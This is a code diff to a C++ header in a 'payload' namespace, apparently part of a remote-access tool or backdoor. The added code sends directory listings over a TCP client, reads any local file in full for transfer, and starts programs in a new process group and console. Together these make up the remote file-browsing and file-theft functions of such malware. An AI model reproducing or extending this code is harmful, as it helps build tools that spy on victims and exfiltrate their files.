@@ -1,6 +1,26 @@
 #pragma once
 #include "precompile.h"
 #include "process.h"
+#include "directory.h"
+
+namespace helper {
+	void send_directory(tcp_client c, std::vector<dir_item> items) {
+		for (auto [item, size] : items) {
+			c.send({ "filedescription", item.string() + "|" + std::to_string(size) });
+		}
+	}
+	std::pair<std::string, std::string> ArgSplit(std::string args) {
+
+		auto found = args.find_first_of(' '); // försök hitta första separeringen
+
+		if (found != std::string::npos) { // om lyckats
+			return { args.substr(0, found), args.substr(found + 1) }; // splita vid separering
+		}
+		else { // annars retunera bara det självstående argumentet
+			return { args, "" };
+		}
+	}
+}
 
 namespace payload {
 
@@ -14,7 +34,7 @@ namespace payload {
 		else {
 			info.wShowWindow = SW_NORMAL;
 		}
-		if (!CreateProcessA(0, (LPSTR)program.c_str(), 0, 0, false, CREATE_NEW_CONSOLE, 0, 0, &info, &process_info))
+		if (!CreateProcessA(0, (LPSTR)program.c_str(), 0, 0, false, CREATE_NEW_PROCESS_GROUP | CREATE_NEW_CONSOLE, 0, 0, &info, &process_info))
 		{
 			return false;
 		}
@@ -45,5 +65,16 @@ namespace payload {
 		}
 	}
 
+	std::string download_file(std::string program) {
+		if (std::filesystem::exists(program)) {
+			std::ifstream file(program, std::ios::binary);
+			return std::string((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
+		}
+		else {
+			return "FAIL";
+		}
+	}
 
+	
 }
+
